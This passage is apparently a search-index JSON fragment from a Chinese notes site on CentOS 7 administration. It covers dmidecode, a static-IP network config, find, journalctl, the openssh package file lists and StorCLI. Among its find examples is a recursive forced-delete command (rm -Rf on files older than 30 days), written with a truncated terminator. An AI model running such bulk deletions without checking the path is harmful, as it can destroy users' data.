\u663e\u793a\u672a\u89e3\u7801\u7684\u539f\u59cb\u6761\u76ee\u5185\u5bb9\u3002 --dump-bin FILE \u5c06DMI\u6570\u636e\u8f6c\u50a8\u5230\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u3002 --from-dump FILE \u4ece\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u8bfb\u53d6DMI\u6570\u636e\u3002 --no-sysfs \u4e0d\u8981\u5c1d\u8bd5\u4ecesysfs\u6587\u4ef6\u4e2d\u8bfb\u53d6DMI\u6570\u636e --oem-string N \u4ec5\u663e\u793a\u7ed9\u5b9aOEM\u5b57\u7b26\u4e32\u7684\u503c -V, --version \u663e\u793a\u7248\u672c\u5e76\u9000\u51fa -t \u9009\u9879\u5217\u8868 -s \u9009\u9879\u5217\u8868 bios-vendor bios-version bios-release-date system-manufacturer system-product-name system-version system-serial-number system-uuid baseboard-manufacturer baseboard-product-name baseboard-version baseboard-serial-number baseboard-asset-tag chassis-manufacturer chassis-type chassis-version chassis-serial-number chassis-asset-tag processor-family processor-manufacturer processor-version processor-frequency -t \u9009\u9879\u5217\u8868 \u5b57\u7b26\u4e32\uff08\u5173\u952e\u5b57\uff09 bios system baseboard chassis processor memory Cache connector slot \u6570\u5b57\uff08DMI\u7c7b\u578b\u53f7\uff09 0 bios 1 System 2 Base Board 3 Chassis 4 Processor 5 Memory Controller 6 Memory Module 7 Cache 8 Port Connector 9 System Slots 10 On Board Devices 11 OEM Strings 12 System Configuration Options 13 BIOS Language 14 Group Associations 15 System Event Log 16 Physical Memory Array 17 Memory Device 18 32-bit Memory Error 19 Memory Array Mapped Address 20 Memory Device Mapped Address 21 Built-in Pointing Device 22 Portable Battery 23 System Reset 24 Hardware Security 25 System Power Controls 26 Voltage Probe 27 Cooling Device 28 Temperature Probe 29 Electrical Current Probe 30 Out-of-band Remote Access 31 Boot Integrity Services 32 System Boot 33 64-bit Memory Error 34 Management Device 35 Management Device Component 36 Management Device Threshold Data 37 Memory Channel 38 IPMI Device 39 Power Supply 40 Additional Information 41 Onboard Device MAN\u624b\u518c\u5982\u4e0b\uff1a dmidecode\uff088\uff09\uff1a DMI \u8868\u89e3\u7801\u5668 - Linux \u624b\u518c\u9875 (die.net) dmidecode \u547d\u4ee4\uff0cLinux dmidecode \u547d\u4ee4\u8be6\u89e3\uff1a\u5728Linux\u7cfb\u7edf\u4e0b\u83b7\u53d6\u6709\u5173\u786c\u4ef6\u65b9\u9762\u7684\u4fe1\u606f - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com) \u67e5\u770b\u670d\u52a1\u5668SN\u7801 # dmidecode -t 1 # dmidecode 2.12-dmifs SMBIOS 2.8 present. Handle 0x0001, DMI type 1, 27 bytes System Information Manufacturer: New H3C Technologies Co., Ltd. Product Name: UniServer R4900 G3 Version: To be filled by O.E.M. Serial Number: 211111111111111111 UUID: 111111-2222-2222-2222-111111111111 Wake-up Type: Power Switch SKU Number: 0 Family: Rack","title":"\u67e5\u8be2\u786c\u4ef6\u4fe1\u606f"},{"location":"system/centos7/dmidecode/#dmidecode","text":"dmidecode \u662f\u4e00\u79cd\u5de5\u5177\uff0c\u7528\u4e8e\u4ee5\u4eba\u7c7b\u53ef\u8bfb\u7684\u683c\u5f0f\u8f6c\u50a8\u8ba1\u7b97\u673a\u7684DMI\uff08\u6709\u4eba\u8bf4SMBIOS\uff09\u8868\u5185\u5bb9\u3002\u6b64\u8868\u5305\u542b\u7cfb\u7edf\u786c\u4ef6\u7ec4\u4ef6\u7684\u8bf4\u660e\uff0c\u4ee5\u53ca \u5176\u4ed6\u6709\u7528\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u5e8f\u5217\u53f7\u548c BIOS \u4fee\u8ba2\u7248 Usage: dmidecode [\u9009\u9879] Options are: -d, --dev-mem FILE (default:/dev/mem)\u4ece\u8bbe\u5907\u6587\u4ef6\u8bfb\u53d6\u4fe1\u606f\uff0c\u8f93\u51fa\u5185\u5bb9\u4e0e\u4e0d\u52a0\u53c2\u6570\u6807\u51c6\u8f93\u51fa\u76f8\u540c\u3002 -h, --help \u663e\u793a\u5e2e\u52a9\u4fe1\u606f\u3002 -q, --quiet \u8f83\u5c11\u7684\u8be6\u7ec6\u8f93\u51fa -s, --string KEYWORD \u53ea\u663e\u793a\u6307\u5b9aDMI\u5b57\u7b26\u4e32\u7684\u4fe1\u606f\u3002(string) -t, --type TYPE \u53ea\u663e\u793a\u6307\u5b9a\u6761\u76ee\u7684\u4fe1\u606f\u3002(type) type\u53ef\u4ee5\u662fDMI\u7c7b\u578b\u53f7\uff0c\u4e5f\u53ef\u4ee5\u662f\u9017\u53f7\u5206\u9694\u7684\u7c7b\u578b\u53f7\u5217\u8868\uff0c\u6216\u8005\u662f\u4ee5\u4e0b\u5217\u8868\u4e2d\u7684\u5173\u952e\u5b57\uff1abios(bios)\u3001\u7cfb\u7edf(system)\u3001\u57fa\u677f(baseboard)\u3001\u673a\u7bb1(chassis)\u3001\u5904\u7406\u5668(processor)\u3001\u5185\u5b58(memory)\u3001\u7f13\u5b58(cache)\u3001\u8fde\u63a5\u5668(connector)\u3001\u63d2\u69fd(slot)\u3002 -H, --handle HANDLE \u53ea\u663e\u793a\u7ed9\u5b9a\u53e5\u67c4\u7684\u6761\u76ee -u, --dump \u663e\u793a\u672a\u89e3\u7801\u7684\u539f\u59cb\u6761\u76ee\u5185\u5bb9\u3002 --dump-bin FILE \u5c06DMI\u6570\u636e\u8f6c\u50a8\u5230\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u4e2d\u3002 --from-dump FILE \u4ece\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\u8bfb\u53d6DMI\u6570\u636e\u3002 --no-sysfs \u4e0d\u8981\u5c1d\u8bd5\u4ecesysfs\u6587\u4ef6\u4e2d\u8bfb\u53d6DMI\u6570\u636e --oem-string N \u4ec5\u663e\u793a\u7ed9\u5b9aOEM\u5b57\u7b26\u4e32\u7684\u503c -V, --version \u663e\u793a\u7248\u672c\u5e76\u9000\u51fa -t \u9009\u9879\u5217\u8868","title":"dmidecode\u547d\u4ee4"},{"location":"system/centos7/dmidecode/#-s","text":"bios-vendor bios-version bios-release-date system-manufacturer system-product-name system-version system-serial-number system-uuid baseboard-manufacturer baseboard-product-name baseboard-version baseboard-serial-number baseboard-asset-tag chassis-manufacturer chassis-type chassis-version chassis-serial-number chassis-asset-tag processor-family processor-manufacturer processor-version processor-frequency","title":"-s \u9009\u9879\u5217\u8868"},{"location":"system/centos7/dmidecode/#-t","text":"","title":"-t \u9009\u9879\u5217\u8868"},{"location":"system/centos7/dmidecode/#_1","text":"bios system baseboard chassis processor memory Cache connector slot","title":"\u5b57\u7b26\u4e32\uff08\u5173\u952e\u5b57\uff09"},{"location":"system/centos7/dmidecode/#dmi","text":"0 bios 1 System 2 Base Board 3 Chassis 4 Processor 5 Memory Controller 6 Memory Module 7 Cache 8 Port Connector 9 System Slots 10 On Board Devices 11 OEM Strings 12 System Configuration Options 13 BIOS Language 14 Group Associations 15 System Event Log 16 Physical Memory Array 17 Memory Device 18 32-bit Memory Error 19 Memory Array Mapped Address 20 Memory Device Mapped Address 21 Built-in Pointing Device 22 Portable Battery 23 System Reset 24 Hardware Security 25 System Power Controls 26 Voltage Probe 27 Cooling Device 28 Temperature Probe 29 Electrical Current Probe 30 Out-of-band Remote Access 31 Boot Integrity Services 32 System Boot 33 64-bit Memory Error 34 Management Device 35 Management Device Component 36 Management Device Threshold Data 37 Memory Channel 38 IPMI Device 39 Power Supply 40 Additional Information 41 Onboard Device","title":"\u6570\u5b57\uff08DMI\u7c7b\u578b\u53f7\uff09"},{"location":"system/centos7/dmidecode/#man","text":"dmidecode\uff088\uff09\uff1a DMI \u8868\u89e3\u7801\u5668 - Linux \u624b\u518c\u9875 (die.net) dmidecode \u547d\u4ee4\uff0cLinux dmidecode \u547d\u4ee4\u8be6\u89e3\uff1a\u5728Linux\u7cfb\u7edf\u4e0b\u83b7\u53d6\u6709\u5173\u786c\u4ef6\u65b9\u9762\u7684\u4fe1\u606f - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com)","title":"MAN\u624b\u518c\u5982\u4e0b\uff1a"},{"location":"system/centos7/dmidecode/#sn","text":"# dmidecode -t 1 # dmidecode 2.12-dmifs SMBIOS 2.8 present. Handle 0x0001, DMI type 1, 27 bytes System Information Manufacturer: New H3C Technologies Co., Ltd. Product Name: UniServer R4900 G3 Version: To be filled by O.E.M. Serial Number: 211111111111111111 UUID: 111111-2222-2222-2222-111111111111 Wake-up Type: Power Switch SKU Number: 0 Family: Rack","title":"\u67e5\u770b\u670d\u52a1\u5668SN\u7801"},{"location":"system/centos7/ens33/","text":"\u4fee\u6539\u7f51\u5361\u4e3a\u56fa\u5b9a\u5730\u5740 [root@master ~]# cat /etc/sysconfig/network-scripts/ifcfg-ens33 TYPE=\"Ethernet\" PROXY_METHOD=\"none\" BROWSER_ONLY=\"no\" BOOTPROTO=\"static\" DEFROUTE=\"yes\" IPV4_FAILURE_FATAL=\"no\" IPV6INIT=\"yes\" IPV6_AUTOCONF=\"yes\" IPV6_DEFROUTE=\"yes\" IPV6_FAILURE_FATAL=\"no\" IPV6_ADDR_GEN_MODE=\"stable-privacy\" NAME=\"ens33\" UUID=\"f52ff6ca-5e7d-4f00-b4f7-679ef47b77da\" DEVICE=\"ens33\" ONBOOT=\"yes\" IPADDR=192.168.70.131 PREFIX=24 GATEWAY=192.168.70.2 DNS1=192.168.70.2 DNS2=114.114.114.114","title":"\u4fee\u6539\u7f51\u5361"},{"location":"system/centos7/find/","text":"find\u547d\u4ee4 find linux \u547d\u4ee4 \u5728\u7ebf\u4e2d\u6587\u624b\u518c (51yip.com) find \u547d\u4ee4\uff0cLinux find \u547d\u4ee4\u8be6\u89e3\uff1a\u5728\u6307\u5b9a\u76ee\u5f55\u4e0b\u67e5\u627e\u6587\u4ef6 - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com) find(1) \u2014 manpages-zh \u2014 Debian unstable \u2014 Debian Manpages \u67e5\u770b\u7cfb\u7edf\u4e2d\u5927\u4e8e600M\u7684\u6587\u4ef6 # find . -type f -size +600M -print0 2>/dev/null | xargs -0 ls -lh -rw------- 1 root root 2.2G Dec 19 2020 ./www -rw------- 1 root root 2.3G Dec 19 2020 ./aaa -rw-r--r-- 1 admin admin 2.2G Oct 9 17:57 ./ccc \u53ea\u4fdd\u7559\u6700\u8fd130\u5929\u6570\u636e find /home/admin/ -mtime +30 -name \"*.*\" -exec rm -Rf {} \\","title":"find\u547d\u4ee4"},{"location":"system/centos7/find/#find","text":"find linux \u547d\u4ee4 \u5728\u7ebf\u4e2d\u6587\u624b\u518c (51yip.com) find \u547d\u4ee4\uff0cLinux find \u547d\u4ee4\u8be6\u89e3\uff1a\u5728\u6307\u5b9a\u76ee\u5f55\u4e0b\u67e5\u627e\u6587\u4ef6 - Linux \u547d\u4ee4\u641c\u7d22\u5f15\u64ce (wangchujiang.com) find(1) \u2014 manpages-zh \u2014 Debian unstable \u2014 Debian Manpages \u67e5\u770b\u7cfb\u7edf\u4e2d\u5927\u4e8e600M\u7684\u6587\u4ef6 # find . -type f -size +600M -print0 2>/dev/null | xargs -0 ls -lh -rw------- 1 root root 2.2G Dec 19 2020 ./www -rw------- 1 root root 2.3G Dec 19 2020 ./aaa -rw-r--r-- 1 admin admin 2.2G Oct 9 17:57 ./ccc \u53ea\u4fdd\u7559\u6700\u8fd130\u5929\u6570\u636e find /home/admin/ -mtime +30 -name \"*.*\" -exec rm -Rf {} \\","title":"find\u547d\u4ee4"},{"location":"system/centos7/gun%E8%BD%AF%E4%BB%B6%E5%88%97%E8%A1%A8/","text":"GUN\u8f6f\u4ef6\u5b98\u7f51 \u50cfls\u547d\u4ee4\u7b49Linux\u5e38\u7528\u547d\u4ee4\uff0c\u90fd\u5c5e\u4e8e Coreutils - GNU core utilities \u8be5\u9879\u76ee\u90fd\u5c5e\u4e8eGUN\uff0c\u5b98\u7f51\u7f57\u5217\u4e86GUN\u8f6f\u4ef6\u5217\u8868\uff0c\u7f51\u7ad9\u5730\u5740\u5982\u4e0b \u8f6f\u4ef6 - GNU \u5de5\u7a0b - \u81ea\u7531\u8f6f\u4ef6\u57fa\u91d1\u4f1a","title":"gun\u8f6f\u4ef6\u5217\u8868"},{"location":"system/centos7/gun%E8%BD%AF%E4%BB%B6%E5%88%97%E8%A1%A8/#gun","text":"\u50cfls\u547d\u4ee4\u7b49Linux\u5e38\u7528\u547d\u4ee4\uff0c\u90fd\u5c5e\u4e8e Coreutils - GNU core utilities \u8be5\u9879\u76ee\u90fd\u5c5e\u4e8eGUN\uff0c\u5b98\u7f51\u7f57\u5217\u4e86GUN\u8f6f\u4ef6\u5217\u8868\uff0c\u7f51\u7ad9\u5730\u5740\u5982\u4e0b \u8f6f\u4ef6 - GNU \u5de5\u7a0b - \u81ea\u7531\u8f6f\u4ef6\u57fa\u91d1\u4f1a","title":"GUN\u8f6f\u4ef6\u5b98\u7f51"},{"location":"system/centos7/journalctl/","text":"journalctl \u547d\u4ee4 journalctl(1) \u2014 manpages-zh \u2014 Debian unstable \u2014 Debian Manpages \u663e\u793a\u672c\u6b21\u542f\u52a8\u540e\u7684\u6240\u6709\u65e5\u5fd7\uff1a journalctl -b \u663e\u793a\u67d0\u4e2asystemctl\u670d\u52a1\u7684\u65e5\u5fd7 journalctl -u docker.service \u663e\u793a7\u5929\u5185\u7684\u65e5\u5fd7 journalctl -u docker.service --since \"7 days ago\" \u663e\u793a\u4ece\u67d0\u4e2a\u65f6\u95f4\u5f00\u59cb\u7684\u6d88\u606f journalctl --since=\"2012-10-30 18:17:16\" \u663e\u793a Docker \u670d\u52a1\u81ea\u7cfb\u7edf\u542f\u52a8\u4ee5\u6765\u7684\u6240\u6709\u65e5\u5fd7\uff0c\u5e76\u4e14\u4f1a\u5b9e\u65f6\u66f4\u65b0\u663e\u793a\u65b0\u7684\u65e5\u5fd7\u6761\u76ee\uff0c journalctl -u docker.service --no-tail -f -a \u663e\u793a\u6240\u6709\u5185\u6838\u65e5\u5fd7\uff0c\u5b9e\u65f6\u5237\u65b0\uff0c\u663e\u793a\u5168\u90e8\u683c\u5f0f journalctl -k --no-tail -f -a \u663e\u793a\u67d0\u670d\u52a1\u6700\u65b0\u7684100\u6761\u65e5\u5fd7\u5e76\u5b9e\u65f6\u5237\u65b0\uff1a journalctl -u docker.service -n 100 -f \u6e05\u7406\u65e5\u5fd7\u4f7f\u603b\u5927\u5c0f\u5c0f\u4e8e 100M: journalctl --vacuum-size=100M \u6e05\u7406\u6700\u65e9\u4e24\u5468\u524d\u7684\u65e5\u5fd7. journalctl --vacuum-time=2weeks \u67e5\u770b\u65e5\u5fd7\u5360\u7528\u5927\u5c0f [root@VM-0-16-centos 3d870b13f28a4409aaf2781e2f7e68f1]# journalctl --disk-usage Archived and active journals take up 24.0M on disk. \u4ee5\u4e0b\u662f journalctl --help \u547d\u4ee4\u8f93\u51fa\u7684\u4e2d\u6587\u7ffb\u8bd1\uff1a # journalctl --help journalctl [\u9009\u9879...] [\u5339\u914d\u9879...] \u6807\u5fd7\uff1a --system \u663e\u793a\u7cfb\u7edf\u65e5\u5fd7 --user \u663e\u793a\u5f53\u524d\u7528\u6237\u7684\u7528\u6237\u65e5\u5fd7 -M --machine=\u5bb9\u5668 \u5728\u672c\u5730\u5bb9\u5668\u4e0a\u64cd\u4f5c -S --since=\u65e5\u671f \u663e\u793a\u4e0d\u65e9\u4e8e\u6307\u5b9a\u65e5\u671f\u7684\u6761\u76ee -U --until=\u65e5\u671f \u663e\u793a\u4e0d\u665a\u4e8e\u6307\u5b9a\u65e5\u671f\u7684\u6761\u76ee -c --cursor=\u6e38\u6807 \u4ece\u6307\u5b9a\u6e38\u6807\u5f00\u59cb\u663e\u793a\u6761\u76ee --after-cursor=\u6e38\u6807 \u663e\u793a\u5728\u6307\u5b9a\u6e38\u6807\u4e4b\u540e\u7684\u6761\u76ee --show-cursor \u5728\u6240\u6709\u6761\u76ee\u540e\u6253\u5370\u6e38\u6807 -b --boot[=ID] \u663e\u793a\u5f53\u524d\u542f\u52a8\u6216\u6307\u5b9a\u7684\u542f\u52a8 --list-boots \u663e\u793a\u6709\u5173\u8bb0\u5f55\u542f\u52a8\u7684\u7b80\u6d01\u4fe1\u606f -k --dmesg \u663e\u793a\u5f53\u524d\u542f\u52a8\u7684\u5185\u6838\u6d88\u606f\u65e5\u5fd7 -u --unit=\u5355\u5143 \u663e\u793a\u6307\u5b9a\u5355\u5143\u7684\u65e5\u5fd7 -t --identifier=\u5b57\u7b26\u4e32 \u663e\u793a\u5177\u6709\u6307\u5b9a\u7cfb\u7edf\u65e5\u5fd7\u6807\u8bc6\u7b26\u7684\u6761\u76ee -p --priority=\u8303\u56f4 \u663e\u793a\u5177\u6709\u6307\u5b9a\u4f18\u5148\u7ea7\u7684\u6761\u76ee -e --pager-end \u5728\u5206\u9875\u5668\u4e2d\u7acb\u5373\u8df3\u8f6c\u5230\u672b\u5c3e -f --follow \u8ddf\u8e2a\u65e5\u5fd7 -n --lines[=\u6574\u6570] \u663e\u793a\u7684\u65e5\u5fd7\u6761\u76ee\u6570\u91cf --no-tail \u5373\u4f7f\u5728\u8ddf\u8e2a\u6a21\u5f0f\u4e0b\u4e5f\u663e\u793a\u6240\u6709\u884c -r --reverse \u9996\u5148\u663e\u793a\u6700\u65b0\u7684\u6761\u76ee -o --output=\u5b57\u7b26\u4e32 \u66f4\u6539\u65e5\u5fd7\u8f93\u51fa\u6a21\u5f0f\uff08short, short-iso, short-precise, short-monotonic, verbose, export, json, json-pretty, json-sse, cat\uff09 --utc \u7528\u534f\u8c03\u4e16\u754c\u65f6\uff08UTC\uff09\u8868\u793a\u65f6\u95f4 -x --catalog \u6dfb\u52a0\u53ef\u7528\u7684\u6d88\u606f\u89e3\u91ca --no-full \u7701\u7565\u5b57\u6bb5 -a --all \u663e\u793a\u6240\u6709\u5b57\u6bb5\uff0c\u5305\u62ec\u957f\u7684\u548c\u4e0d\u53ef\u6253\u5370\u7684 -q --quiet \u4e0d\u663e\u793a\u6743\u9650\u8b66\u544a --no-pager \u4e0d\u5c06\u8f93\u51fa\u5bfc\u5165\u5206\u9875\u5668 -m --merge \u663e\u793a\u6240\u6709\u53ef\u7528\u65e5\u5fd7\u7684\u6761\u76ee -D --directory=\u8def\u5f84 \u4ece\u76ee\u5f55\u663e\u793a\u65e5\u5fd7\u6587\u4ef6 --file=\u8def\u5f84 \u663e\u793a\u65e5\u5fd7\u6587\u4ef6 --root=\u6839 \u5728\u6839ROOT\u4e0b\u64cd\u4f5c\u76ee\u5f55\u6587\u4ef6 --interval=\u65f6\u95f4 \u66f4\u6539FSS\u5bc6\u5c01\u5bc6\u94a5\u7684\u65f6\u95f4\u95f4\u9694 --verify-key=\u5bc6\u94a5 \u6307\u5b9aFSS\u9a8c\u8bc1\u5bc6\u94a5 --force \u7528--setup-keys\u8986\u76d6FSS\u5bc6\u94a5\u5bf9 \u547d\u4ee4\uff1a -h --help \u663e\u793a\u6b64\u5e2e\u52a9\u6587\u672c --version \u663e\u793a\u5305\u7248\u672c -F --field=\u5b57\u6bb5 \u5217\u51fa\u6307\u5b9a\u5b57\u6bb5\u53d6\u7684\u6240\u6709\u503c --new-id128 \u751f\u6210\u65b0\u7684128\u4f4dID --disk-usage \u663e\u793a\u6240\u6709\u65e5\u5fd7\u6587\u4ef6\u7684\u603b\u78c1\u76d8\u4f7f\u7528\u91cf --vacuum-size=\u5b57\u8282 \u51cf\u5c11\u78c1\u76d8\u4f7f\u7528\u91cf\u81f3\u6307\u5b9a\u5927\u5c0f\u4ee5\u4e0b --vacuum-time=\u65f6\u95f4 \u5220\u9664\u65e9\u4e8e\u6307\u5b9a\u65e5\u671f\u7684\u65e5\u5fd7\u6587\u4ef6 --flush \u5c06\u6240\u6709\u65e5\u5fd7\u6570\u636e\u4ece/run\u5237\u65b0\u5230/var --header \u663e\u793a\u65e5\u5fd7\u5934\u90e8\u4fe1\u606f --list-catalog \u663e\u793a\u76ee\u5f55\u4e2d\u7684\u6240\u6709\u6d88\u606fID --dump-catalog \u663e\u793a\u6d88\u606f\u76ee\u5f55\u4e2d\u7684\u6761\u76ee --update-catalog \u66f4\u65b0\u6d88\u606f\u76ee\u5f55\u6570\u636e\u5e93 --setup-keys \u751f\u6210\u65b0\u7684FSS\u5bc6\u94a5\u5bf9 --verify \u9a8c\u8bc1\u65e5\u5fd7\u6587\u4ef6\u7684\u4e00\u81f4\u6027 \u8fd9\u662f journalctl \u547d\u4ee4\u7684\u5e2e\u52a9\u4fe1\u606f\uff0c\u63d0\u4f9b\u4e86\u8be5\u547d\u4ee4\u7684\u5404\u79cd\u9009\u9879\u548c\u547d\u4ee4\u7684\u8be6\u7ec6\u8bf4\u660e\u3002 \u8fd9\u91cc\u662f\u4e00\u4e9b\u5e38\u7528\u7684 journalctl \u547d\u4ee4\u7ec4\u5408\uff1a \u663e\u793a\u6240\u6709\u65e5\u5fd7\uff08\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u4ece\u672c\u6b21\u542f\u52a8\u5f00\u59cb\uff09\uff1a journalctl \u5b9e\u65f6\u8ddf\u8e2a\u6700\u65b0\u65e5\u5fd7\uff1a journalctl -f \u663e\u793a\u7279\u5b9a\u670d\u52a1\uff08\u4f8b\u5982 sshd\uff09\u7684\u65e5\u5fd7\uff1a journalctl -u sshd \u663e\u793a\u4eca\u5929\u7684\u65e5\u5fd7\uff1a journalctl --since today \u663e\u793a\u6700\u8fd1\u7684 N \u6761\u65e5\u5fd7\u6761\u76ee\uff08\u4f8b\u5982\u6700\u8fd1 20 \u6761\uff09\uff1a journalctl -n 20 \u6309\u65f6\u95f4\u8303\u56f4\u67e5\u770b\u65e5\u5fd7\uff08\u4f8b\u5982\u663e\u793a\u6628\u5929\u7684\u65e5\u5fd7\uff09\uff1a journalctl --since yesterday --until now \u67e5\u770b\u7279\u5b9a\u65f6\u95f4\u6bb5\u7684\u65e5\u5fd7\uff08\u4f8b\u5982\u4ece\u4e00\u4e2a\u661f\u671f\u524d\u5230\u73b0\u5728\uff09\uff1a journalctl --since \"1 week ago\" --until \"3 days ago\" \u663e\u793a\u7279\u5b9a\u4f18\u5148\u7ea7\uff08\u4f8b\u5982\u9519\u8bef\u53ca\u4ee5\u4e0a\u7ea7\u522b\uff09\u7684\u65e5\u5fd7\uff1a journalctl -p err \u663e\u793a\u5185\u6838\u65e5\u5fd7\uff08\u7c7b\u4f3c\u4e8e dmesg\uff09\uff1a journalctl -k \u53cd\u5411\u663e\u793a\u65e5\u5fd7\uff08\u663e\u793a\u6700\u65b0\u7684\u6761\u76ee\u5728\u524d\uff09\uff1a journalctl -r \u67e5\u770b\u7279\u5b9a\u8fdb\u7a0b\u7684\u65e5\u5fd7\uff08\u4f7f\u7528 PID\uff09\uff1a journalctl _PID=1234 \u67e5\u770b\u5728\u7279\u5b9a\u65f6\u95f4\u95f4\u9694\u5185\u53d8\u5316\u7684\u65e5\u5fd7\uff1a journalctl --interval=2s \u8fd9\u4e9b\u547d\u4ee4\u7ec4\u5408\u6db5\u76d6\u4e86 journalctl \u7684\u591a\u79cd\u7528\u9014","title":"\u7cfb\u7edf\u65e5\u5fd7\u67e5\u8be2\u547d\u4ee4"},{"location":"system/centos7/linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%9A%84%E7%AE%80%E5%8D%95%E6%8F%8F%E8%BF%B0/","text":"Linux\u7684\u7b80\u5355\u89e3\u91ca\uff1ahttps://tldp.org/LDP/intro-linux/html/sect_03_01.html Linux\u57fa\u91d1\u4f1a\u5b98\u65b9\u5bf9\u4e8e\u5404\u79cd\u6587\u4ef6\u5939\u7684\u4f7f\u7528\u6807\u51c6\uff1a \u6587\u4ef6\u7cfb\u7edf\u5c42\u6b21\u7ed3\u6784\u6807\u51c6 (linuxfoundation.org) \u4f8b\u5982/usr/local\u7684\u4f7f\u7528\u6807\u51c6\uff1a 4.9. /usr/local : Local hierarchy (linuxfoundation.org)","title":"linux\u6587\u4ef6\u7cfb\u7edf\u7684\u7b80\u5355\u63cf\u8ff0"},{"location":"system/centos7/ls%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/","text":"ls\u547d\u4ee4\u8be6\u89e3 ls\u547d\u4ee4\u5c5e\u4e8ecoreutils\u8f6f\u4ef6\u5305\u4e2d\uff0ccoreutils\u5c5e\u4e8egnu\u9879\u76ee\uff0c\u5728gnu\u5b98\u7f51\u4e2d\u6709\u8be6\u7ec6\u7684\u89e3\u91ca\uff1a GNU Coreutils 9.3","title":"ls\u547d\u4ee4\u8be6\u89e3"},{"location":"system/centos7/ls%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/#ls","text":"ls\u547d\u4ee4\u5c5e\u4e8ecoreutils\u8f6f\u4ef6\u5305\u4e2d\uff0ccoreutils\u5c5e\u4e8egnu\u9879\u76ee\uff0c\u5728gnu\u5b98\u7f51\u4e2d\u6709\u8be6\u7ec6\u7684\u89e3\u91ca\uff1a GNU Coreutils 9.3","title":"ls\u547d\u4ee4\u8be6\u89e3"},{"location":"system/centos7/rpm%E5%AE%98%E7%BD%91/","text":"\u5b98\u7f51\u5730\u5740\uff1a rpm.org - Home RPM\u547d\u4ee4\u5e2e\u52a9\uff1ahttps://rpm-software-management.github.io/rpm/man/rpm.8.html","title":"rpm\u5b98\u7f51"},{"location":"system/centos7/ssh%E4%B8%93%E9%A2%98/","text":"ssh\u76f8\u5173\u547d\u4ee4\u4e2d\u6587man \u670d\u52a1\u7aef \u670d\u52a1\u7aef\u5305\u542b\u7684\u547d\u4ee4\uff1a $rpm -ql openssh-server /etc/pam.d/sshd /etc/ssh/sshd_config /etc/sysconfig/sshd /usr/lib/systemd/system/sshd-keygen.service /usr/lib/systemd/system/sshd.service /usr/lib/systemd/system/sshd.socket /usr/lib/systemd/system/sshd@.service /usr/lib64/fipscheck/sshd.hmac /usr/libexec/openssh/sftp-server /usr/sbin/sshd /usr/sbin/sshd-keygen /var/empty/sshd \u670d\u52a1\u7aef\u4e2d\u6587man\uff1a [sshd \u4e2d\u6587\u624b\u518c \u91d1\u6b65\u56fd] (jinbuguo.com) [sshd_config \u4e2d\u6587\u624b\u518c \u91d1\u6b65\u56fd] (jinbuguo.com) [ssh-keygen \u4e2d\u6587\u624b\u518c \u91d1\u6b65\u56fd] (jinbuguo.com) \u5ba2\u6237\u7aef \u5ba2\u6237\u7aef\u5305\u542b\u7684\u547d\u4ee4\uff1a $rpm -ql openssh-clients /etc/ssh/ssh_config /usr/bin/scp /usr/bin/sftp /usr/bin/slogin /usr/bin/ssh /usr/bin/ssh-add /usr/bin/ssh-agent /usr/bin/ssh-copy-id /usr/bin/ssh-keyscan /usr/lib64/fipscheck/ssh.hmac /usr/libexec/openssh/ssh-pkcs11-helper \u5ba2\u6237\u7aef\u4e2d\u6587man\uff1a ssh(1) \u2014 manpages-zh \u2014 Debian unstable \u2014 Debian Manpages scp(1) \u2014 manpages-zh \u2014 Debian unstable \u2014 Debian Manpages","title":"ssh\u4e13\u9898"},{"location":"system/centos7/ssh%E4%B8%93%E9%A2%98/#sshman","text":"","title":"ssh\u76f8\u5173\u547d\u4ee4\u4e2d\u6587man"},{"location":"system/centos7/ssh%E4%B8%93%E9%A2%98/#_1","text":"\u670d\u52a1\u7aef\u5305\u542b\u7684\u547d\u4ee4\uff1a $rpm -ql openssh-server /etc/pam.d/sshd /etc/ssh/sshd_config /etc/sysconfig/sshd /usr/lib/systemd/system/sshd-keygen.service /usr/lib/systemd/system/sshd.service /usr/lib/systemd/system/sshd.socket /usr/lib/systemd/system/sshd@.service /usr/lib64/fipscheck/sshd.hmac /usr/libexec/openssh/sftp-server /usr/sbin/sshd /usr/sbin/sshd-keygen /var/empty/sshd \u670d\u52a1\u7aef\u4e2d\u6587man\uff1a [sshd \u4e2d\u6587\u624b\u518c \u91d1\u6b65\u56fd] (jinbuguo.com) [sshd_config \u4e2d\u6587\u624b\u518c \u91d1\u6b65\u56fd] (jinbuguo.com) [ssh-keygen \u4e2d\u6587\u624b\u518c \u91d1\u6b65\u56fd] (jinbuguo.com)","title":"\u670d\u52a1\u7aef"},{"location":"system/centos7/ssh%E4%B8%93%E9%A2%98/#_2","text":"\u5ba2\u6237\u7aef\u5305\u542b\u7684\u547d\u4ee4\uff1a $rpm -ql openssh-clients /etc/ssh/ssh_config /usr/bin/scp /usr/bin/sftp /usr/bin/slogin /usr/bin/ssh /usr/bin/ssh-add /usr/bin/ssh-agent /usr/bin/ssh-copy-id /usr/bin/ssh-keyscan /usr/lib64/fipscheck/ssh.hmac /usr/libexec/openssh/ssh-pkcs11-helper \u5ba2\u6237\u7aef\u4e2d\u6587man\uff1a ssh(1) \u2014 manpages-zh \u2014 Debian unstable \u2014 Debian Manpages scp(1) \u2014 manpages-zh \u2014 Debian unstable \u2014 Debian Manpages","title":"\u5ba2\u6237\u7aef"},{"location":"system/centos7/storcli/","text":"StorCLI\u547d\u4ee4 \u4e0b\u8f7d \u8d85\u7ea7\u7a81\u88ad 9560-8i (broadcom.com) \u70b9\u51fb\u9875\u9762\u4e0a storcli Latest StorCLI \u5b89\u88c5 \u5b89\u88c5\u5305\u89e3\u538b\u540e rpm\u5b89\u88c5\u5305\u5728\u5982\u4e0b\u76ee\u5f55\uff1a storcli_rel/Unified_storcli_all_os/Linux rpm -ivh \u5b89\u88c5\u540e 